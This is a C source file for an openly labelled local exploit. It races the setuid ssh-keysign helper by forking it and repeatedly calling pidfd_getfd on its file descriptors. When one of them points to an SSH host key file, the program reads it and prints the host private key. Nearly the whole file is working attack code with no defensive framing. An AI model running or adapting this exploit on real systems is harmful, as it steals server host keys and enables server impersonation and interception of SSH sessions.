

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/syscall.h>

#define MAX_ROUNDS      800
#define MAX_FDS_SCAN    64
#define MAX_TRIES       25000

// Raw syscalls for older glibc
#ifndef __NR_pidfd_open
#define __NR_pidfd_open  434
#endif
#ifndef __NR_pidfd_getfd
#define __NR_pidfd_getfd 438
#endif

static int pidfd_open(pid_t pid, unsigned flags) {
    return syscall(__NR_pidfd_open, pid, flags);
}

static int pidfd_getfd(int pidfd, int target_fd, unsigned flags) {
    return syscall(__NR_pidfd_getfd, pidfd, target_fd, flags);
}

int main(void) {
    printf("[+] Target: Steal SSH host private keys via ssh-keysign\n\n");

    const char *ssh_keysign_paths[] = {
        "/usr/libexec/ssh-keysign",
        "/usr/lib/openssh/ssh-keysign",
        "/usr/lib/ssh/ssh-keysign",
        "/usr/libexec/openssh/ssh-keysign",
        NULL
    };

    const char *binary = NULL;
    for (int i = 0; ssh_keysign_paths[i]; i++) {
        if (access(ssh_keysign_paths[i], X_OK) == 0) {
            binary = ssh_keysign_paths[i];
            break;
        }
    }

    if (!binary) {
        fprintf(stderr, "[-] ssh-keysign not found. Install openssh-server.\n");
        return 1;
    }

    printf("[+] Found ssh-keysign at: %s\n", binary);
    printf("[+] Starting race attack...\n");

    int success = 0;

    for (int round = 0; round < MAX_ROUNDS && !success; round++) {
        pid_t child = fork();
        if (child == 0) {
            // Child: silent execution of ssh-keysign
            int nullfd = open("/dev/null", O_RDWR);
            dup2(nullfd, 0);
            dup2(nullfd, 1);
            dup2(nullfd, 2);
            close(nullfd);

            execl(binary, "ssh-keysign", NULL);
            _exit(127);
        }

        int pidfd = pidfd_open(child, 0);
        if (pidfd < 0) {
            waitpid(child, NULL, 0);
            continue;
        }

        for (int attempt = 0; attempt < MAX_TRIES && !success; attempt++) {
            for (int fd = 3; fd < MAX_FDS_SCAN; fd++) {
                int stolen_fd = pidfd_getfd(pidfd, fd, 0);
                if (stolen_fd < 0) continue;

                // Check if this fd points to an SSH host key
                char linkpath[128], realpath[512];
                snprintf(linkpath, sizeof(linkpath), "/proc/self/fd/%d", stolen_fd);
                ssize_t len = readlink(linkpath, realpath, sizeof(realpath) - 1);

                if (len > 0) {
                    realpath[len] = '\0';
                    if (strstr(realpath, "ssh_host_") && strstr(realpath, "_key")) {
                        printf("[+] SUCCESS! Stolen fd %d -> %s (round %d)\n", fd, realpath, round);

                        // Read and dump the private key
                        lseek(stolen_fd, 0, SEEK_SET);
                        char buffer[8192];
                        ssize_t n = read(stolen_fd, buffer, sizeof(buffer) - 1);
                        if (n > 0) {
                            buffer[n] = '\0';
                            printf("\n=== SSH PRIVATE KEY ===\n%s\n", buffer);
                        }
                        close(stolen_fd);
                        success = 1;
                        break;
                    }
                }
                close(stolen_fd);
            }
        }

        close(pidfd);
        waitpid(child, NULL, 0);

        if ((round + 1) % 50 == 0) {
            printf("[.] Still racing... (%d/%d)\n", round + 1, MAX_ROUNDS);
        }
    }

    if (success) {
        printf("[+] Exploit completed successfully.\n");
    } else {
        printf("[-] Failed after %d rounds. Try increasing MAX_ROUNDS.\n", MAX_ROUNDS);
    }

    return success ? 0 : 1;
}
